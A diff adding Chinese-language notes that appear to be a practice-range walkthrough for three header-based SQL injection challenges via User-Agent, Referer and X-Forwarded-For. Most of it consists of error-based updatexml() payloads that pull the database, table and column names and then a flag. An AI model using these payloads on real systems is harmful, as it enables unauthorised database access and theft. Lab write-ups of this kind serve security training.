@@ -1,0 +1,29 @@
+靶场
+1.必须先有正确的账号密码
+
+2.这里可以查看代码用的是什么方式获取信息的 第一题是$_SERVER['HTTP_USER_AGENT']    
+										   第二题是$_SERVER['HTTP_REFERER'] 
+										   第三题是$_SERVER["REMOTE_ADDR"]  
+										   
+3.这地方屏蔽了' 进制转换等 不是sql注入了 用请求头的方式 
+1' and updatexml(1,concat(0x7e,(select database())),1),'3') -- qwe
+
+4.输入正确的账号密码 页面会显示数据库报错信息 里面就有我们想要的库名
+
+5.然后老办法找到表名 字段名
+1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),'3') -- qwe 找表名
+
+1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='flag_head' limit 1,1)),1),'3') -- qwe 找字段名
+
+1' and updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 1,1)),1),'3') -- qwe 找flag
+
+
+第二题和第一题是同样的方法 只不过user_agent换成了referer
+
+
+第三题需要用到抓包
+
+抓包后写在X-Forwarded-For后面 没有就自己加一个（记得冒号后面有个空格）
+X-Forwarded-For: 1' and updatexml(1,concat(0x7e,(select database())),1),'3') -- qwe
+
+得到库名后 接下来就老办法 表名 字段名 然后flag
